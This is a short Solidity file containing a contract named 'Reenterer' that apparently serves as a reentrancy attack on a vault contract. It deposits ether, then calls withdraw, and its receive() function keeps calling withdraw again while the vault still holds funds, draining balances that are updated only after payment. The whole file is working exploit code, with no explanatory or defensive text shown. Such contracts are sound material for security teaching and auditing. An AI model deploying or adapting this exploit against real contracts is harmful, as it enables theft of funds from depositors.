// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Reenterer {
    IVault public vault;
    uint256 public amount;

    constructor(address v) { vault = IVault(v); }

    function attack() external payable {
        amount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(amount);
    }

    // called when the vault sends value — re-enter while our balance still reads full
    receive() external payable {
        if (address(vault).balance >= amount) {
            vault.withdraw(amount);
        }
    }
}